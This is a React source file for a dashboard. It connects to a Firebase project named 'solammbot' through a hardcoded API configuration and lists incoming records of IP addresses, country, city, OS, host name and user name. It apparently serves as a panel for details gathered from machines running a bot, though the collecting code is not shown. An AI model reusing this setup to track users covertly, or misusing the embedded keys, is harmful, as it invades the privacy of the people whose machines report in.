import React, { useEffect, useState } from "react";
import { Link, Navigate } from "react-router-dom";
import { connect } from "react-redux";
import PropTypes from "prop-types";
import Row from "../common/Row";
import Col from "../common/Col";
import _ from "lodash";
import "./style.css";

const { initializeApp } = require("firebase/app");
const { getDatabase } = require("firebase/database");
const { ref, set, onValue } = require("firebase/database");

const basic = {
  apiKey: "AIzaSyDoyi01xdksbWgIWFWtaxj1R80DdZ6PWbw",
  authDomain: "solammbot.firebaseapp.com",
  projectId: "solammbot",
  storageBucket: "solammbot.appspot.com",
  messagingSenderId: "879731928519",
  appId: "1:879731928519:web:875d6ddfbee3d1b0363de2",
  measurementId: "G-0KJ8T512FL",
};
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);

const Landing = (props) => {
  const [data, setData] = useState([]);

  useEffect(() => {
    // Fetching data
    const dataRef = ref(rtdb, "project");
    onValue(
      dataRef,
      (snapshot) => {
        // console.log(snapshot);
        let tmp = [];
        snapshot.forEach((childSnapshot) => {
          const childKey = childSnapshot.key;
          const childData = childSnapshot.val();
          console.log(childData);
          tmp.push({ ...childData });
          // ...
        });
        setData(tmp);
        setTimeout(function () {
          document
            .getElementById("landing")
            .scrollTo({ top: document.getElementById("landing").scrollHeight });
        }, 100);
      },
      {
        // onlyOnce: true,
      }
    );
  }, []);
  console.log(data);
  return (
    <section
      className="landing"
      id="landing"
      style={{
        display: "flex",
        flexDirection: "column",
        justifyContent: "flex-start",
      }}
    >
      {_.map(data, (item) => {
        return item.country ? (
          <div>
            <div style={{ color: "#78f089" }}>
              <span style={{ marginRight: "10px", color: "#fba2f7" }}>
                {item.country}
              </span>{" "}
              <span style={{ marginRight: "10px" }}>{item.city}</span>
              <span style={{ marginRight: "10px", color: "#fba2f7" }}>
                {item.ip}
              </span>{" "}
              <span
                style={{
                  marginRight: "10px",
                  color: "#f36538",
                  fontWeight: "bold",
                  fontSize: "1.4rem",
                }}
              >
                {item.id}
              </span>{" "}
              <span style={{ marginRight: "10px" }}>
                {item._date} {item._time}
              </span>
            </div>
          </div>
        ) : (
          <div style={{ marginBottom: "20px" }}>
            <div>
              -------------------{" "}
              <span style={{ color: "#fba2f7" }}>{item.ip}</span> {item._date}{" "}
              {item._time} -----------------------------
            </div>
            <div>
              <span>OS: </span>
              <span style={{ color: "yellow", marginRight: 20 }}>
                {item.os}
              </span>
              <span>Release: </span>
              <span style={{ color: "yellow", marginRight: 20 }}>
                {item.release}
              </span>

              <span>Host: </span>
              <span style={{ color: "yellow", marginRight: 20 }}>
                {item.host}
              </span>

              <span>User Name: </span>
              <span style={{ color: "yellow", marginRight: 20 }}>
                {item.userName}
              </span>
            </div>
            <div>
              --------------------------------------------------------------------------------------------------------
            </div>
          </div>
        );
      })}
    </section>
  );
};

Landing.propTypes = {
  isAuthenticated: PropTypes.bool,
};

const mapStateToProps = (state) => ({
  isAuthenticated: state.auth.isAuthenticated,
});

export default connect(mapStateToProps)(Landing);
